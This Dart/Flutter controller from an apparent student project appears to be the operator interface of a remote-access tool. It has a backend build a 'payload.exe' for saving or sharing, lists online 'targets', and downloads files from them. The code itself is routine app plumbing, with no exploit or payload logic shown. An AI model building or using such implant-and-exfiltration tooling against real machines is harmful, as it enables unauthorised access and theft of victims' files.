import 'dart:io';

import 'package:file_picker/file_picker.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:get/get.dart';
import 'package:inferno_core_fyp/models/online_target_model.dart';
import 'package:inferno_core_fyp/models/target_file.dart';
import 'package:inferno_core_fyp/models/targets_model.dart';
import 'package:path_provider/path_provider.dart';
import 'package:share_plus/share_plus.dart';

import '../../repository/target_repository.dart';
import '../../utils/utils.dart';
import '../../view/show_file.dart';

class TargetController extends GetxController {
  final _repo = TargetRepository();
  final nameController = TextEditingController().obs;
  final accessedUserController = TextEditingController().obs;
  final targetIdController = TextEditingController().obs;
  final userIdController = TextEditingController().obs;
  final targetIdFocusNode = FocusNode().obs;
  final userIdFocusNode = FocusNode().obs;

  RxBool loading = false.obs, isError = false.obs;
  RxBool loading2 = false.obs, isError2 = false.obs;
  RxBool loading3 = false.obs, isError3 = false.obs;
  RxString errorStr = ''.obs;
  String filePath = '';
  RxList<Target> allTargets = <Target>[].obs;
  RxList<TargetFile> targetFiles = <TargetFile>[].obs;
  RxList<OnlineTarget> onlineTargets = <OnlineTarget>[].obs;

  Future pickFile() async {
    try {
      FilePickerResult? result = await FilePicker.platform.pickFiles();

      if (result != null) {
        filePath = result.files.single.path!;
      } else {
        // User canceled the file picker.
        Utils.toastMsg("No file selected");
      }
    } catch (e) {
      debugPrint("Error picking file: $e");
    }
  }

  // Future<void> getTarget(String targetId) async {
  //   try {
  //     isError.value = false;
  //     loading.value = true;
  //     final Map<String, String> params = {
  //       'target_id': targetId,
  //     };
  //     final Map<String, dynamic> data = await _repo.getTarget(params);
  //
  //     final TargetModel fileModel = TargetModel.fromJson(data);
  //     files.assignAll(fileModel.files);
  //     loading.value = false; // Update collections
  //   } catch (error) {
  //     loading.value = false;
  //     isError.value = true;
  //     errorStr.value = error.toString();
  //   }
  // }

  Future<void> getAllTargets() async {
    try {
      isError.value = false;
      loading.value = true;
      final List<dynamic> jsonData = await _repo.getAllTargets();

      allTargets.value = jsonData.map((data) => Target.fromJson(data)).toList();
      loading.value = false;
    } catch (error) {
      loading.value = false;
      isError.value = true;
      errorStr.value = error.toString();
    }
  }

  Future<void> getAllTargetsOnline() async {
    try {
      isError2.value = false;
      loading2.value = true;
      Map<String, dynamic> jsonMap = await _repo.getAllTargetsOnline();

      List<dynamic> jsonData = jsonMap['online_accessible_targets'];
      onlineTargets.value =
          jsonData.map((data) => OnlineTarget.fromJson(data)).toList();
      loading2.value = false; // Update collections
    } catch (error) {
      loading2.value = false;
      isError2.value = true;
      errorStr.value = error.toString();
    }
  }

  Future<void> getAllTargetFiles() async {
    try {
      isError3.value = false;
      loading3.value = true;

      List<dynamic> jsonData = await _repo.getAllTargetFiles();
      targetFiles.value =
          jsonData.map((data) => TargetFile.fromJson(data)).toList();
      loading3.value = false; // Update collections
    } catch (error) {
      loading3.value = false;
      isError3.value = true;
      errorStr.value = error.toString();
    }
  }

  Future<void> targetFileDownload(
      {required String targetId,
      required String fileRef,
      required String fileName}) async {
    try {
      Utils.showLoadingDialog('Downloading...');
      Map data = {"target_id": targetId, "file_ref": fileRef};

      Uint8List fileBytes = await _repo.targetFileDownload(data);
      Utils.dismissLoadingDialog();
      Get.to(
        () => ShowFile(
          appBarTitle: 'File',
          text: 'Your File is ready!!',
          imgPath: "assets/images/file_img.png",
          onPressed: () => downloadFile(
            fileBytes: fileBytes,
            fileName: fileName.split('.').first,
            extension: fileName.split('.').last,
          ),
          onPressedShared: () => shareFile(
            fileBytes: fileBytes,
            fileName: fileName.split('.').first,
            extension: fileName.split('.').last,
          ),
        ),
      );
      getAllTargets();
      getAllTargetsOnline();
    } catch (error) {
      Utils.dismissLoadingDialog();
      Utils.toastMsg("Error: $error");
    }
  }

  Future createTarget() async {
    try {
      Utils.showLoadingDialog('Creating...');
      Map data = {
        "accessible_by_users": [accessedUserController.value.text.trim()],
        "name": nameController.value.text.trim(),
        "icon_base64": "",
      };
      Uint8List fileBytes = await _repo.createTarget(data);
      Utils.dismissLoadingDialog();
      Get.to(
        () => ShowFile(
          appBarTitle: 'PayLoad',
          text: 'Your PayLoad is ready!!',
          imgPath: "assets/images/exe_img.png",
          onPressed: () => downloadFile(
            fileBytes: fileBytes,
            fileName: "payload",
            extension: "exe",
          ),
          onPressedShared: () => shareFile(
            fileBytes: fileBytes,
            fileName: "payload",
            extension: "exe",
          ),
        ),
      );
      getAllTargets();
      getAllTargetsOnline();
    } catch (error) {
      Utils.dismissLoadingDialog();
      Utils.toastMsg("Error: $error");
    }
  }

  Future addUserToTarget() async {
    try {
      Utils.showLoadingDialog('Adding...');
      await _repo
          .addUserToTarget(
        targetId: "",
        userId: "",
      )
          .then((response) async {
        Utils.dismissLoadingDialog();
        Utils.toastMsg("User added successfully");
        Get.back();
      });
    } catch (error) {
      Utils.dismissLoadingDialog();
      Utils.toastMsg("Error: $error");
    }
  }

  Future removeUserFromTarget() async {
    try {
      Utils.showLoadingDialog('Removing...');
      await _repo
          .removeUserFromTarget(
        targetId: "",
        userId: "",
      )
          .then((response) async {
        Utils.dismissLoadingDialog();
        Utils.toastMsg("User removed successfully");
        Get.back();
      });
    } catch (error) {
      Utils.dismissLoadingDialog();
      Utils.toastMsg("Error: $error");
    }
  }

  Future deleteTarget(String targetId) async {
    try {
      Utils.showLoadingDialog('Deleting...');
      final Map<String, String> params = {
        'target_id': targetId,
      };
      await _repo.deleteTarget(params).then((response) async {
        Utils.dismissLoadingDialog();
        getAllTargets();
        getAllTargetsOnline();
        if (response['detail'] != null) {
          Utils.toastMsg(response['detail']);
        } else {
          Utils.toastMsg("Target deleted successfully");
        }
      });
    } catch (error) {
      Utils.dismissLoadingDialog();
      Utils.toastMsg("Error: $error");
    }
  }

  Future<void> downloadFile({
    required Uint8List fileBytes,
    required String fileName,
    required String extension,
  }) async {
    try {
      Utils.showLoadingDialog('Downloading...');
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      String filename = '$fileName-$timestamp.$extension'.trim();
      await _repo.createFile(filename, fileBytes);
      Utils.dismissLoadingDialog();
    } catch (error) {
      Utils.dismissLoadingDialog();
      Utils.toastMsg("Error: $error");
    }
  }

  Future<void> shareFile({
    required Uint8List fileBytes,
    required String fileName,
    required String extension,
  }) async {
    try {
      final tempDir = await getTemporaryDirectory();
      final tempFile = File('${tempDir.path}/$fileName.$extension');
      await tempFile.writeAsBytes(fileBytes);

      Share.shareXFiles([XFile(tempFile.path)]).then((value) {
        tempFile.delete();
      });
    } catch (e) {
      Utils.toastMsg("Error sharing Payload: $e");
    }
  }
}
